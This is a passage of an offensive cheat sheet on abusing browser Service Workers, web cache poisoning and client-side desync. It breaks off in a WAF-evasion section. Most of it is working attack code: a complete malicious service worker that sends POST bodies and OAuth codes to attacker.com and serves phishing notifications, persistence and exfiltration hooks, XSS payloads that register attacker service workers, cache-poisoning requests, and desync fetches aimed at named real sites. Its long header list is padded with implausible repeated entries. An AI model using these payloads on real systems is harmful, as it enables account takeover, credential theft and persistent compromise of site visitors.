    'X-Device-Multipath', 'X-Device-Delay', 'X-Device-Spread',
    'X-Device-Diversity', 'X-Device-MIMO', 'X-Device-OFDM',
    'X-Device-SC-FDMA', 'X-Device-CDMA', 'X-Device-TDMA',
    'X-Device-FDMA', 'X-Device-SDMA', 'X-Device-OFDMA'
];

async function probeUnkeyedHeaders(targetUrl) {
    const results = [];
    for (const header of UNKEYED_HEADERS) {
        const response = await fetch(targetUrl, {
            headers: { [header]: 'https://attacker.com/' }
        });
        const text = await response.text();
        if (text.includes('attacker.com')) {
            results.push(header);
        }
    }
    return results;
}
```

### Service Worker + CDN Cache Poisoning

```javascript
// Chain: SW detects cache miss → poisons CDN cache → all users get XSS
self.addEventListener('fetch', event => {
    const cacheStatus = event.request.headers.get('CF-Cache-Status') || 
                        event.request.headers.get('X-Cache') ||
                        event.request.headers.get('Akamai-Cache-Status');

    if (cacheStatus === 'MISS') {
        // This request will populate the cache — poison it
        event.respondWith(
            fetch(event.request).then(response => {
                const clone = response.clone();
                return clone.text().then(body => {
                    if (body.includes('</body>')) {
                        const poisoned = body.replace('</body>', 
                            `<script>alert('cache poisoned')</script></body>`);
                        return new Response(poisoned, {
                            status: response.status,
                            headers: response.headers
                        });
                    }
                    return response;
                });
            })
        );
    }
});
```

### Route Poisoning via X-Original-URL / X-Rewrite-URL

```http
GET /anything HTTP/1.1
Host: unity.com
X-Original-URL: /admin
```

A Service Worker can automatically inject these headers into all requests:

```javascript
self.addEventListener('fetch', event => {
    const modified = new Request(event.request, {
        headers: {
            ...event.request.headers,
            'X-Original-URL': '/admin',
            'X-Rewrite-URL': '/admin'
        }
    });
    event.respondWith(fetch(modified));
});
```

---

## Browser Persistence Techniques

### Persistent SW Registration

```javascript
// Ensure SW survives browser restarts and page navigations
self.addEventListener('install', event => {
    self.skipWaiting();
});

self.addEventListener('activate', event => {
    event.waitUntil(self.clients.claim());
});

// Re-register on every page load via injected script
const persistenceScript = `
<script>
(async () => {
    if (!navigator.serviceWorker.controller) {
        await navigator.serviceWorker.register('/sw.js', { scope: '/' });
    }
})();
</script>
`;
```

### Periodic Background Sync Abuse

```javascript
// Register periodic sync (Chrome only, requires permission)
self.addEventListener('periodicsync', event => {
    if (event.tag === 'harvest-data') {
        event.waitUntil(
            indexedDB.open('stolen').then(db => {
                // Harvest and exfiltrate data periodically
                return fetch('https://attacker.com/periodic', {
                    method: 'POST',
                    body: JSON.stringify({ timestamp: Date.now() })
                });
            })
        );
    }
});

// Main page registration
navigator.serviceWorker.ready.then(registration => {
    registration.periodicSync.register('harvest-data', {
        minInterval: 24 * 60 * 60 * 1000 // Daily
    });
});
```

### Background Fetch Abuse

```javascript
// Background fetch allows large file downloads in background
self.addEventListener('backgroundfetchsuccess', event => {
    event.waitUntil(
        event.registration.matchAll().then(records => {
            return Promise.all(records.map(record => {
                return record.responseReady.then(response => {
                    // Exfiltrate downloaded file content
                    return response.text().then(text => {
                        fetch('https://attacker.com/bg-fetch', {
                            method: 'POST',
                            body: text
                        });
                    });
                });
            }));
        })
    );
});
```

### IndexedDB Persistence

```javascript
// Store stolen data in IndexedDB for later exfiltration
const dbPromise = indexedDB.open('attacker-db', 1);
dbPromise.onupgradeneeded = event => {
    const db = event.target.result;
    db.createObjectStore('credentials', { keyPath: 'id', autoIncrement: true });
};

self.addEventListener('fetch', event => {
    if (event.request.url.includes('/login') && event.request.method === 'POST') {
        event.request.clone().text().then(body => {
            dbPromise.onsuccess = event => {
                const db = event.target.result;
                const tx = db.transaction('credentials', 'readwrite');
                tx.objectStore('credentials').add({
                    url: event.request.url,
                    body: body,
                    time: Date.now()
                });
            };
        });
    }
});
```

---

## Parser Confusion Payloads

### MIME Type Confusion via SW

```javascript
// Force browser to interpret JSON as HTML
self.addEventListener('fetch', event => {
    if (event.request.url.includes('/api/config')) {
        event.respondWith(
            fetch(event.request).then(response => {
                return new Response(response.body, {
                    status: response.status,
                    headers: {
                        ...response.headers,
                        'Content-Type': 'text/html'
                    }
                });
            })
        );
    }
});
```

### Charset Confusion

```javascript
// Force UTF-7 interpretation (legacy browsers) or UTF-16
self.addEventListener('fetch', event => {
    event.respondWith(
        fetch(event.request).then(response => {
            return new Response(response.body, {
                headers: {
                    'Content-Type': 'text/html; charset=utf-7'
                }
            });
        })
    );
});
```

### JSON Parser Confusion

```javascript
// Return malformed JSON that causes parser error → leaks data via error messages
self.addEventListener('fetch', event => {
    if (event.request.url.includes('/api/')) {
        event.respondWith(
            new Response(`{ "data": "<script>alert(1)</script>" }`, {
                headers: { 'Content-Type': 'application/json' }
            })
        );
    }
});
```

---

## Browser Quirks

### Chrome Connection Pool Behavior

- Chrome maintains **separate connection pools** for requests with and without credentials
- Always use `credentials: 'include'` when poisoning to affect the "with-cookies" pool
- Use `mode: 'no-cors'` to see connection IDs in DevTools Network tab

```javascript
fetch('https://victim.com/', {
    method: 'POST',
    body: maliciousPrefix,
    mode: 'no-cors',      // Ensures connection ID visibility
    credentials: 'include' // Poisons the with-cookies pool
});
```

### Stacked Response Problem

Browsers discard connections if they receive more response data than expected. This affects HEAD-based desync attacks:

```javascript
// Solution: Add cache-buster to delay response and avoid stacking
const cacheBuster = Date.now();
fetch(`https://victim.com/404/?cb=${cacheBuster}`, {
    method: 'POST',
    body: `HEAD /404/?cb=${cacheBuster} HTTP/1.1
...`,
    credentials: 'include',
    mode: 'cors' // Throw CORS error instead of following redirect
}).catch(() => {
    location = 'https://victim.com/';
});
```

### Safari HSTS Mixed Content Bypass

Safari upgrades HTTP redirects to HTTPS if the target is in the HSTS cache. This can be exploited to bypass mixed-content protections when hijacking JS loads.

### Edge Mixed Content Bypass

Edge allows 302 redirects to HTTPS URLs to bypass mixed-content protection for scripts/stylesheets.

### Firefox SHIELD System

Firefox's SHIELD system fetches recipes from `normandy.cdn.mozilla.net`. If an attacker can poison the X-Forwarded-Host header in a cached response, they can redirect all Firefox users to attacker-controlled recipes.

---

## Gadget Chains

### DOM Clobbering → SW Registration

```html
<!-- DOM Clobbering sets window.config to the form element -->
<form name="config">
    <input name="swUrl" value="https://attacker.com/sw.js">
    <input name="scope" value="/">
</form>

<script>
// App uses window.config.swUrl and window.config.scope
// navigator.serviceWorker.register(config.swUrl.value, { scope: config.scope.value })
</script>
```

### Angular / React Config Injection → SW

```javascript
// Angular app reads config from window.ENV
window.ENV = {
    SERVICE_WORKER_URL: 'https://attacker.com/sw.js',
    SERVICE_WORKER_SCOPE: '/'
};
// App calls: navigator.serviceWorker.register(window.ENV.SERVICE_WORKER_URL, {scope: window.ENV.SERVICE_WORKER_SCOPE})
```

### Webpack Runtime Injection → SW

```javascript
// Pollute webpack's publicPath or chunk loading to load SW from attacker
__webpack_public_path__ = 'https://attacker.com/';
// Dynamic import loads attacker-controlled chunk that registers SW
import('https://attacker.com/malicious-chunk.js');
```

### LocalStorage / sessionStorage Gadget

```javascript
// App reads SW config from localStorage
localStorage.setItem('sw_config', JSON.stringify({
    url: 'https://attacker.com/sw.js',
    scope: '/'
}));
```

---

## Real World Case Studies

### Case Study 1: Akamai + Capital One — Stacked HEAD Desync

**Target**: `www.capitalone.ca` (Akamai CDN)  
**Vector**: POST to `/assets` (redirect endpoint) ignores Content-Length  
**Technique**: Stacked HEAD response splicing with cache-buster delay  
**Impact**: XSS on every page via poisoned connection pool

```javascript
fetch('https://www.capitalone.ca/assets', {
    method: 'POST',
    body: `HEAD /404/?cb=${Date.now()} HTTP/1.1
Host: www.capitalone.ca

GET /x?x=<script>alert(1)</script> HTTP/1.1
X: Y`,
    credentials: 'include',
    mode: 'cors'
}).catch(() => {
    location = 'https://www.capitalone.ca/';
});
```

### Case Study 2: Cisco Web VPN — Client-Side Cache Poisoning

**Target**: Cisco ASA WebVPN  
**Vector**: POST to homepage ignores Content-Length (CL.0 desync)  
**Technique**: Host-header redirect gadget + client-side cache poisoning  
**Chain**:
1. Poison socket with redirect to attacker.com
2. Navigate to `/+CSCOE+/win.js` (triggers poisoned redirect)
3. Browser caches redirect for `win.js`
4. Navigate to login page, browser uses cached redirect for `win.js`
5. Attacker serves malicious JS polyglot

### Case Study 3: Amazon.com — H2.0 Desync Worm

**Target**: `www.amazon.com`  
**Vector**: POST to `/b/` ignores Content-Length (HTTP/2 → HTTP/1.1 downgrade)  
**Impact**: Stored victim requests (including auth tokens) in attacker's shopping list  
**Worm Potential**: Browser-powered desync could make each victim re-launch the attack, creating a self-replicating desync worm.

### Case Study 4: Mozilla SHIELD Hijacking

**Target**: `normandy.cdn.mozilla.net`  
**Vector**: Unkeyed `X-Forwarded-Host` header  
**Impact**: Redirect all Firefox users to attacker-controlled recipes  
**Note**: Recipes are signed, but unsigned backend recipes + DDoS potential + memory corruption chain possible.

### Case Study 5: Cloudflare Blog — Hidden Route Poisoning

**Target**: `blog.cloudflare.com` (Ghost platform)  
**Vector**: `X-Forwarded-Host: noshandnibble.ghost.io` → redirect to custom domain  
**Impact**: Hijack image loads; on Safari/Edge, hijack JS loads for full XSS  
**Bypass**: HTTP redirect blocked by mixed-content, but Safari HSTS upgrade + Edge 302-to-HTTPS bypass allowed full compromise.

---

## Fuzzing Payloads

### Service Worker Scope Fuzzing

```
/sw.js?scope=/
/sw.js?scope=/../
/sw.js?scope=//
/sw.js?scope=/../../../
/sw.js?scope=%2f
/sw.js?scope=%2f%2e%2e%2f
/sw.js?scope=/admin/..
/sw.js?scope=/app/../../../
/sw.js?scope=~/
/sw.js?scope=/./
/sw.js?scope=/.././../
```

### Registration Parameter Fuzzing

```javascript
// Fuzz navigator.serviceWorker.register options
const fuzzOptions = [
    { scope: '/' },
    { scope: '/../' },
    { scope: new URL('https://attacker.com/') },
    { scope: null },
    { scope: undefined },
    { scope: '' },
    { scope: '/\x00' },
    { scope: '/
' },
    { updateViaCache: 'all' },
    { updateViaCache: 'none' },
    { type: 'module' },
    { type: 'classic' }
];
```

### Header Fuzzing for Cache Poisoning

```python
# Python fuzzing script for unkeyed headers
import requests

headers = [
    "X-Forwarded-Host", "X-Forwarded-For", "X-Original-URL",
    "X-Rewrite-URL", "X-HTTP-Host-Override", "Forwarded",
    "X-Host", "X-Forwarded-Server", "X-Forwarded-Scheme",
    "X-Original-Scheme", "X-Forwarded-Proto", "X-Forwarded-Port",
    "X-Forwarded-Prefix", "X-Real-IP", "X-Remote-IP",
    "X-Remote-Addr", "X-Client-IP", "Client-IP",
    "True-Client-IP", "CF-Connecting-IP", "X-Cluster-Client-IP",
    "X-Forwarded-By", "X-Forwarded-Base", "X-ProxyUser-Ip",
    "X-Wap-Profile", "X-Arbitrary", "X-Custom",
    "X-HTTP-DestinationURL", "X-HTTP-Override",
    "X-HTTP-Method", "X-HTTP-Method-Override",
    "X-Method-Override", "X-Rewrite-Base",
    "X-Original-Remote-Addr", "X-Proxy-Url",
    "X-Proxy-Destination", "X-Proxy-Destination-Url",
    "X-Request-Uri", "X-Request-Url", "X-Request-Origin",
    "Origin", "Referer", "Accept", "Accept-Encoding",
    "Accept-Language", "Accept-Charset", "Cookie",
    "User-Agent", "DNT", "Connection",
    "Upgrade-Insecure-Requests", "Cache-Control",
    "Pragma", "If-Modified-Since", "If-None-Match",
    "If-Match", "If-Range", "Range", "TE",
    "Trailer", "Transfer-Encoding", "Content-Length",
    "Content-Type", "Content-Encoding", "Content-Language",
    "Content-Location", "Content-MD5", "Content-Range",
    "X-Api-Version", "X-Api-Key", "X-Auth-Token",
    "X-CSRF-Token", "X-Requested-With", "X-Request-ID",
    "X-Correlation-ID", "X-Trace-ID", "X-Session-ID",
    "X-Device-User-Agent", "X-Device-IP", "X-Device-MAC",
    "X-Device-ID", "X-Device-OS", "X-Device-Model",
    "X-Device-Version", "X-Device-Platform", "X-Device-Network",
    "X-Device-Carrier", "X-Device-Screen", "X-Device-Language",
    "X-Device-Timezone", "X-Device-Location", "X-Device-Coordinates",
    "X-Device-Altitude", "X-Device-Bearing", "X-Device-Speed",
    "X-Device-Accuracy", "X-Device-Provider", "X-Device-Source",
    "X-Device-Channel", "X-Device-Campaign", "X-Device-Medium",
    "X-Device-Content", "X-Device-Term", "X-Device-Keyword",
    "X-Device-Creative", "X-Device-Adgroup", "X-Device-Placement",
    "X-Device-Target", "X-Device-Segment", "X-Device-Audience",
    "X-Device-Interest", "X-Device-Behavior", "X-Device-Intent",
    "X-Device-Context", "X-Device-Environment", "X-Device-Situation",
    "X-Device-Occasion", "X-Device-Season", "X-Device-Weather",
    "X-Device-Temperature", "X-Device-Humidity", "X-Device-Pressure",
    "X-Device-Visibility", "X-Device-UV", "X-Device-AQI",
    "X-Device-Pollen", "X-Device-Traffic", "X-Device-Congestion",
    "X-Device-Transit", "X-Device-Parking", "X-Device-Toll",
    "X-Device-Fuel", "X-Device-Charge", "X-Device-Battery",
    "X-Device-Storage", "X-Device-Memory", "X-Device-CPU",
    "X-Device-GPU", "X-Device-RAM", "X-Device-ROM",
    "X-Device-Bandwidth", "X-Device-Latency", "X-Device-Jitter",
    "X-Device-Packet-Loss", "X-Device-Signal", "X-Device-Noise",
    "X-Device-SNR", "X-Device-RSSI", "X-Device-RSRP",
    "X-Device-RSRQ", "X-Device-SINR", "X-Device-ECIO",
    "X-Device-RSCP", "X-Device-EbNo", "X-Device-CQI",
    "X-Device-MCS", "X-Device-RB", "X-Device-TBS",
    "X-Device-HARQ", "X-Device-BLER", "X-Device-FER",
    "X-Device-BER", "X-Device-PER", "X-Device-SER",
    "X-Device-WER", "X-Device-MER", "X-Device-CER",
    "X-Device-IER", "X-Device-OER", "X-Device-UER",
    "X-Device-DER", "X-Device-RER", "X-Device-FER",
    "X-Device-Gain", "X-Device-Attenuation", "X-Device-Distortion",
    "X-Device-Interference", "X-Device-Doppler", "X-Device-Fading",
    "X-Device-Multipath", "X-Device-Delay", "X-Device-Spread",
    "X-Device-Diversity", "X-Device-MIMO", "X-Device-OFDM",
    "X-Device-SC-FDMA", "X-Device-CDMA", "X-Device-TDMA",
    "X-Device-FDMA", "X-Device-SDMA", "X-Device-OFDMA"
]

def fuzz_unkeyed(target_url):
    for header in headers:
        r = requests.get(target_url, headers={header: "https://attacker.com/"})
        if "attacker.com" in r.text:
            print(f"[+] Unkeyed header found: {header}")
            print(f"    Status: {r.status_code}")
            print(f"    Cache: {r.headers.get('CF-Cache-Status', r.headers.get('X-Cache', 'unknown'))}")
```

---

## Automation Workflows

### Recon Automation Pipeline

```bash
#!/bin/bash
# service_worker_recon.sh

TARGET=$1

# Step 1: Discover Service Worker scripts
katana -u "$TARGET" -jc | grep -iE "(sw\.js|service.?worker|serviceworker)" | tee sw_urls.txt

# Step 2: Check SW scope and registration endpoints
while read url; do
    echo "[*] Analyzing: $url"
    curl -s "$url" | grep -E "(scope|register|addEventListener)" | head -20
    echo "---"
done < sw_urls.txt

# Step 3: Check for SW registration in main JS bundles
httpx -l sw_urls.txt -mc 200 -o sw_live.txt

# Step 4: Test for scope escalation
gau "$TARGET" | grep -E "\.(js|json)$" | xargs -I {} sh -c '
    echo "Testing scope escalation on: {}"
    curl -s "{}" | grep -oE "navigator\.serviceWorker\.register\([^)]+\)" | head -5
'

# Step 5: Check for postMessage handlers that might trigger SW
katana -u "$TARGET" -jc | grep -i "postmessage" | tee postmessage_endpoints.txt
```

### Exploitation Automation

```python
#!/usr/bin/env python3
# sw_exploit.py

import requests
import argparse
from urllib.parse import urljoin, urlparse

class ServiceWorkerExploiter:
    def __init__(self, target, attacker_url):
        self.target = target
        self.attacker = attacker_url
        self.session = requests.Session()

    def check_sw_registration(self):
        """Check if target has Service Worker registration"""
        r = self.session.get(self.target)
        indicators = [
            'navigator.serviceWorker',
            'serviceWorker.register',
            'sw.js',
            'workbox',
            'ServiceWorker'
        ]
        for indicator in indicators:
            if indicator in r.text:
                print(f"[+] SW indicator found: {indicator}")
        return any(i in r.text for i in indicators)

    def test_scope_escalation(self, sw_url):
        """Test for scope escalation via path traversal"""
        payloads = ['/', '/../', '/../../../', '//', '/%2f%2e%2e%2f']
        for scope in payloads:
            print(f"[*] Testing scope: {scope}")
            # This would be injected via XSS or other JS execution
            # navigator.serviceWorker.register(sw_url, {scope: scope})

    def generate_xss_payload(self):
        """Generate XSS payload that registers malicious SW"""
        payload = f"""
        <script>
        navigator.serviceWorker.register('{self.attacker}/sw.js', {{
            scope: '/'
        }}).then(reg => {{
            console.log('SW registered with scope:', reg.scope);
            reg.installing?.postMessage({{type:'SKIP_WAITING'}});
        }});
        </script>
        """
        return payload

    def generate_desync_payload(self):
        """Generate client-side desync payload"""
        return f"""
        <script>
        fetch('{self.target}/favicon.ico', {{
            method: 'POST',
            body: 'GET /404 HTTP/1.1\r\nX: Y',
            mode: 'no-cors',
            credentials: 'include'
        }}).then(() => {{
            location = '{self.target}/';
        }});
        </script>
        """

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', required=True)
    parser.add_argument('-a', '--attacker', required=True)
    args = parser.parse_args()

    exploiter = ServiceWorkerExploiter(args.target, args.attacker)
    exploiter.check_sw_registration()
```

---

## Recon Methodology

### Phase 1: Service Worker Discovery

1. **Source Code Analysis**
   ```bash
   # Search for SW registration in JavaScript bundles
   grep -r "navigator.serviceWorker" ./js/
   grep -r "serviceWorker.register" ./js/
   grep -r "workbox" ./js/
   ```

2. **Network Traffic Analysis**
   - Filter DevTools Network tab by `serviceworker`
   - Look for `sw.js`, `service-worker.js`, `worker.js`
   - Check `Service-Worker-Allowed` header (sets max scope)

3. **Endpoint Fuzzing**
   ```
   /sw.js
   /service-worker.js
   /worker.js
   /assets/sw.js
   /static/service-worker.js
   /app/sw.js
   /offline.js
   /pwa.js
   /manifest/sw.js
   ```

4. **Scope Enumeration**
   ```javascript
   // In DevTools console on target site
   navigator.serviceWorker.getRegistration().then(reg => {
       console.log('Scope:', reg?.scope);
       console.log('SW URL:', reg?.active?.scriptURL);
   });

   // List all registrations
   navigator.serviceWorker.getRegistrations().then(regs => {
       regs.forEach(r => console.log(r.scope, r.active?.scriptURL));
   });
   ```

### Phase 2: Registration Vector Identification

1. **XSS Vectors**: Any XSS on the origin allows SW registration
2. **postMessage Vectors**: Check for unvalidated `postMessage` handlers
3. **Open Redirects**: Can an attacker host a SW at the victim origin?
4. **Prototype Pollution**: Can `__proto__` pollution affect SW config?
5. **DOM Clobbering**: Can HTML elements override SW config variables?
6. **JSONP / Callbacks**: Can attacker-controlled JS be executed?

### Phase 3: Exploitation Surface Mapping

1. **Fetch Interception Points**: What APIs does the app call?
2. **Cache Targets**: What resources are cached? (check `caches.keys()`)
3. **OAuth Endpoints**: Are there OAuth flows to intercept?
4. **Push Notification Endpoints**: Is push messaging enabled?
5. **Background Sync**: Is periodic sync registered?

### Phase 4: Cache Poisoning Assessment

1. **Identify Cache Layers**: CDN (Cloudflare, Akamai, Fastly), browser cache, SW cache
2. **Find Unkeyed Inputs**: Use Param Miner or manual header fuzzing
3. **Test Cacheability**: Which responses are cached? (check `CF-Cache-Status`, `X-Cache`, `Age`)
4. **Exploit Unkeyed Inputs**: Inject XSS via `X-Forwarded-Host`, `X-Original-URL`, etc.

---

## Nuclei Templates

### Template 1: Service Worker Detection

```yaml
id: service-worker-detect

info:
  name: Service Worker Script Detection
  author: custom
  severity: info
  description: Detects Service Worker scripts that may be exploitable
  tags: serviceworker,pwa,recon

requests:
  - method: GET
    path:
      - "{{BaseURL}}/sw.js"
      - "{{BaseURL}}/service-worker.js"
      - "{{BaseURL}}/worker.js"
      - "{{BaseURL}}/assets/sw.js"
      - "{{BaseURL}}/static/service-worker.js"
      - "{{BaseURL}}/app/sw.js"
      - "{{BaseURL}}/offline.js"
      - "{{BaseURL}}/pwa.js"

    matchers:
      - type: word
        words:
          - "self.addEventListener"
          - "caches.open"
          - "fetch(event.request)"
          - "install"
          - "activate"
          - "skipWaiting"
          - "clients.claim"
          - "workbox"
        condition: or

    extractors:
      - type: regex
        name: scope
        regex:
          - "scope['"]\s*:\s*['"]([^'"]+)['"]"
      - type: regex
        name: cache_names
        regex:
          - "caches\.open\(['"]([^'"]+)['"]\)"
```

### Template 2: Service Worker Registration XSS

```yaml
id: sw-registration-xss

info:
  name: Service Worker Registration via XSS
  author: custom
  severity: critical
  description: Detects XSS that can be chained to register a malicious Service Worker
  tags: xss,serviceworker,cache-poisoning

requests:
  - method: GET
    path:
      - "{{BaseURL}}/search?q=<script>navigator.serviceWorker.register('https://attacker.com/sw.js',{scope:'/'})</script>"
      - "{{BaseURL}}/api/redirect?url=javascript:navigator.serviceWorker.register('https://attacker.com/sw.js',{scope:'/'})"

    matchers:
      - type: word
        words:
          - "navigator.serviceWorker"
        part: body
```

### Template 3: Unkeyed Header Cache Poisoning

```yaml
id: unkeyed-header-cache-poisoning

info:
  name: Unkeyed Header Cache Poisoning
  author: custom
  severity: high
  description: Tests for cache poisoning via unkeyed headers
  tags: cache-poisoning,unkeyed-header,serviceworker

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?cachebuster={{randstr}}"
    headers:
      X-Forwarded-Host: "{{interactsh-url}}"
      X-Original-URL: "/admin"
      X-Rewrite-URL: "/admin"

    matchers:
      - type: word
        words:
          - "{{interactsh-url}}"
        part: body
```

### Template 4: postMessage SW Registration Vector

```yaml
id: postmessage-sw-vector

info:
  name: postMessage Service Worker Registration Vector
  author: custom
  severity: high
  description: Detects postMessage handlers that may allow SW registration
  tags: postmessage,serviceworker,xss

requests:
  - method: GET
    path:
      - "{{BaseURL}}"

    matchers:
      - type: regex
        regex:
          - "addEventListener\(['"]message['"]"
          - "postMessage\("
          - "navigator\.serviceWorker\.register"
        condition: and
```

### Template 5: OAuth Token Endpoint Interception

```yaml
id: oauth-sw-interception

info:
  name: OAuth Token Endpoint Service Worker Interception
  author: custom
  severity: critical
  description: Detects OAuth endpoints that could be intercepted by a malicious SW
  tags: oauth,serviceworker,token-theft

requests:
  - method: GET
    path:
      - "{{BaseURL}}/oauth/token"
      - "{{BaseURL}}/api/auth/token"
      - "{{BaseURL}}/auth/callback"
      - "{{BaseURL}}/oauth/callback"

    matchers:
      - type: status
        status:
          - 200
          - 400
          - 401
```

---

## Tools and Scanners

### Essential Tools

| Tool | Purpose | URL |
|------|---------|-----|
| **Param Miner** | Unkeyed header discovery (Burp Suite) | PortSwigger BApp Store |
| **HTTP Request Smuggler** | Desync attack detection | PortSwigger BApp Store |
| **Turbo Intruder** | High-speed request smuggling | PortSwigger BApp Store |
| **katana** | Crawling and JS endpoint discovery | github.com/projectdiscovery/katana |
| **httpx** | Fast HTTP probing | github.com/projectdiscovery/httpx |
| **nuclei** | Vulnerability scanning | github.com/projectdiscovery/nuclei |
| **pp-finder** | Prototype pollution gadget finder | github.com/yeswehack/pp-finder |
| **postMessage-tracker** | postMessage vulnerability detection | github.com/fransr/postMessage-tracker |
| **CursedChrome** | Chrome extension/SW abuse framework | github.com/mandatoryprogrammer/CursedChrome |
| **xsleaks** | XS-Leaks research and tools | github.com/xsleaks/xsleaks |

### Burp Suite Extensions

1. **Param Miner**: Automatically guesses header names and detects unkeyed inputs
2. **HTTP Request Smuggler**: Automated desync detection with browser-powered variants
3. **DOM Invader**: Detects DOM XSS and prototype pollution gadgets
4. **Logger++**: Enhanced logging for connection ID tracking

### Custom Scripts

```bash
# Check Service Worker internals in Chrome
chrome://serviceworker-internals/

# Check Service Worker registrations
chrome://inspect/#service-workers

# Firefox about:debugging
about:debugging#/runtime/this-firefox
```

---

## Advanced Research

### Browser-Powered Desync Attacks (PortSwigger, 2022)

**Key Innovation**: Turning the victim's browser into a desync delivery platform, enabling attacks on single-server websites and internal networks.

**Attack Classes**:
- **CL.0 / H2.0**: Server ignores Content-Length → body becomes prefix of next request
- **Client-Side Desync (CSD)**: Desync between browser and front-end server
- **Pause-Based Desync**: Triggering timeout misconfigurations in Varnish/Apache

**Service Worker Integration**:
- SW maintains persistent desync by periodically triggering poisoned connections
- SW intercepts desynced responses and serves them to all clients
- SW can turn a one-time CSD into a persistent backdoor

### Web Cache Entanglement (PortSwigger)

When multiple cache layers (CDN, reverse proxy, browser cache, SW cache) interact, poisoning one can cascade to others. Service Workers sit at the innermost layer and can:
- Detect outer cache poisoning attempts
- Amplify poisoning by replicating poisoned responses across SW cache entries
- Serve poisoned responses offline when outer caches expire

### Hidden OAuth Attack Vectors (PortSwigger, 2021)

**Dynamic Client Registration SSRF**:
- `logo_uri`, `jwks_uri`, `sector_identifier_uri`, `request_uris` are fetched by the server
- Second-order SSRF: URLs are stored during registration, fetched later during authorization
- Service Worker can intercept these fetches if registered on the OAuth server

**redirect_uri Session Poisoning**:
- OAuth servers storing `redirect_uri` in session are vulnerable to race conditions
- Attacker sends hidden auth request with malicious `redirect_uri`, user approves legitimate request, token goes to attacker
- SW can automate the hidden auth request in the background

### Client-Side Prototype Pollution + SW

Client-side prototype pollution gadgets can lead to SW registration:
- Pollute `Object.prototype.scope` to escalate SW scope
- Pollute `Object.prototype.swUrl` to redirect SW load
- Combine with DOM clobbering for reliable exploitation

---

## Bug Bounty Writeups

### Writeup 1: Service Worker XSS Persistence

**Researcher**: @filedescriptor  
**Platform**: Medium  
**Key Finding**: Service Workers can maintain XSS persistence even after the original vulnerability is patched by re-injecting the payload on every page load via fetch interception.

### Writeup 2: Cache Poisoning to Account Takeover

**Researcher**: James Kettle (PortSwigger)  
**Key Finding**: Unkeyed `X-Forwarded-Host` header in Akamai/Cloudflare configurations allows cache poisoning that serves XSS to all users. Combined with Service Workers, this becomes a persistent account takeover vector.

### Writeup 3: OAuth Token Theft via SW

**Researcher**: Various  
**Key Finding**: Malicious Service Worker intercepts OAuth callback, steals authorization code, and forwards to attacker before the legitimate app processes it. Works on both authorization code and implicit flows.

### Writeup 4: postMessage → SW → XS-Leak Chain

**Researcher**: XS-Leaks Wiki contributors  
**Key Finding**: postMessage without origin validation allows SW registration, which then uses connection pool timing to leak cross-origin information.

### Writeup 5: Browser-Powered Desync Worm

**Researcher**: James Kettle (PortSwigger)  
**Key Finding**: Amazon.com H2.0 desync could have been weaponized as a self-replicating worm where each infected victim's browser re-launches the attack against others.

---

## Payload Collections

### Service Worker Payloads

```javascript
// === PAYLOAD A: Full-featured malicious Service Worker ===
const ATTACKER = 'https://attacker.com';
const TARGET_ORIGIN = self.location.origin;

// Install: claim all clients immediately
self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));

// Fetch interceptor: exfiltrate + modify
self.addEventListener('fetch', event => {
    const url = new URL(event.request.url);

    // Exfiltrate all POST bodies
    if (event.request.method === 'POST') {
        event.request.clone().text().then(body => {
            fetch(`${ATTACKER}/exfil`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    url: event.request.url,
                    body: body,
                    time: Date.now(),
                    origin: TARGET_ORIGIN
                })
            });
        });
    }

    // Intercept OAuth callbacks
    if (url.pathname.match(/\/oauth\/callback|\/auth\/callback/)) {
        const code = url.searchParams.get('code');
        if (code) {
            fetch(`${ATTACKER}/oauth?code=${encodeURIComponent(code)}&state=${url.searchParams.get('state')}`);
        }
    }

    // Modify HTML responses to inject persistence
    event.respondWith(
        fetch(event.request).then(response => {
            const type = response.headers.get('content-type') || '';
            if (type.includes('text/html')) {
                return response.text().then(html => {
                    const hook = `<script>navigator.serviceWorker.register('/sw.js',{scope:'/'})</script>`;
                    if (!html.includes('navigator.serviceWorker.register')) {
                        html = html.replace('</head>', hook + '</head>');
                    }
                    return new Response(html, { status: response.status, headers: response.headers });
                });
            }
            return response;
        })
    );
});

// Push notification phishing
self.addEventListener('push', event => {
    event.waitUntil(
        self.registration.showNotification('Security Alert', {
            body: 'Unusual activity detected. Click to review.',
            icon: '/favicon.ico',
            data: { url: `${ATTACKER}/phish` }
        })
    );
});

self.addEventListener('notificationclick', event => {
    event.waitUntil(clients.openWindow(event.notification.data.url));
});

// Message handler for client communication
self.addEventListener('message', event => {
    if (event.data.type === 'GET_COOKIES') {
        // Cannot directly access cookies in SW, but can read from request headers
        event.source.postMessage({ type: 'COOKIES', data: 'Use fetch interceptor' });
    }
});
```

### XSS-to-SW Registration Payloads

```html
<!-- Basic reflected XSS to SW -->
<script>navigator.serviceWorker.register('//attacker.com/sw.js',{scope:'/'})</script>

<!-- DOM XSS via innerHTML (no script tags allowed) -->
<img src=x onerror="navigator.serviceWorker.register('https://attacker.com/sw.js',{scope:'/'})">

<!-- SVG-based SW registration -->
<svg xmlns="http://www.w3.org/2000/svg" onload="navigator.serviceWorker.register('https://attacker.com/sw.js',{scope:'/'})">

<!-- Template injection (Angular, Vue, etc.) -->
{{constructor.constructor('navigator.serviceWorker.register("https://attacker.com/sw.js",{scope:"/"})')()}}

<!-- Prototype pollution gadget -->
<script>Object.prototype.swUrl='https://attacker.com/sw.js';Object.prototype.scope='/'</script>
```

### Cache Poisoning Payloads

```http
# X-Forwarded-Host XSS poisoning
GET /en?cb=1 HTTP/1.1
Host: www.target.com
X-Forwarded-Host: a."><script>alert(1)</script>

# X-Original-URL route poisoning
GET /anything HTTP/1.1
Host: www.target.com
X-Original-URL: /admin

# X-Rewrite-URL cache key bypass
GET /education?x=y HTTP/1.1
Host: www.target.com
X-Rewrite-URL: /gambling?x=y

# Cookie-based cache poisoning
GET / HTTP/1.1
Host: www.target.com
Cookie: locale=es; session=abc
X-Forwarded-Host: attacker.com

# Host header attack via desync
POST /assets HTTP/1.1
Host: www.target.com
Content-Length: 67

HEAD /404/?cb=123 HTTP/1.1
GET /x?<script>evil()</script> HTTP/1.1
X: Y
```

---

## WAF Bypasses

### WAF Evasion for SW Registration

```javascript
// Split string concatenation
navigator["service" + "Worker"]["register"]("https://attacker.com/sw.js", {
    scope: "/"
});

// Using atob for URL obfuscation
